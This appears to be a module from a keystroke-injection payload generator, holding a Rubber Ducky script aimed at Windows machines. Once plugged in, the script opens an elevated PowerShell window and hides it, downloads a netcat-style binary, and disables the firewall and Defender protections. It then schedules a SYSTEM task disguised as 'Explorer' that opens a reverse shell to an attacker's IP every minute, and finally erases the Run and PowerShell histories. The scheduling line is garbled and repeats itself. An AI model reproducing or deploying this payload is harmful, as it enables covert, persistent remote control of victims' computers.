class info:
    author="n0nuser"
    description = "Downloads TomDaley92's win-cat and sets it as a service. IP and Port needed; Terminal refers to either \"powershell\" or \"cmd\"."
    function = "Reverse Shell"
    parameters = [ "IP", "PORT", "TERMINAL" ]
    content = """\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750

STRING cd C:/Users/Public/Documents
ENTER
DELAY 300
STRING mkdir .ssh
ENTER
DELAY 300
STRING cd .ssh
ENTER
DELAY 300
STRING wget https://github.com/tomdaley92/win-cat/raw/master/bin/wc.exe -OutFile a.exe"
ENTER
DELAY 500

STRING netsh advfirewall set allprofiles state off;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableBehaviorMonitoring 1;Set-MpPreference -DisableOnAccessProtection 1;Set-MpPreference -DisableScanOnRealtimeEnable 1;Set-MpPreference -PUAProtection 0;Gpupdate /Force
ENTER
DELAY 3000

STRING schtasks /create /tn Explorer /tr \"Start-Process -NoNewWindow ./a.exe -k -c STRING schtasks /create /tn Explorer /tr \"Start-Process -NoNewWindow ./a.exe -k -c TERMINAL IP PORT\" /sc minute /mo 1 /ru System"\" /sc minute /mo 1 /ru System" + 
ENTER
DELAY 500

STRING Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
ENTER
DELAY 1000
STRING Clear-History; rm (Get-PSReadlineOption).HistorySavePath
ENTER
DELAY 750

STRING exit
ENTER\
"""

# To remove the scheduled task: Unregister-ScheduledTask -TaskName Explorer -Confirm:$false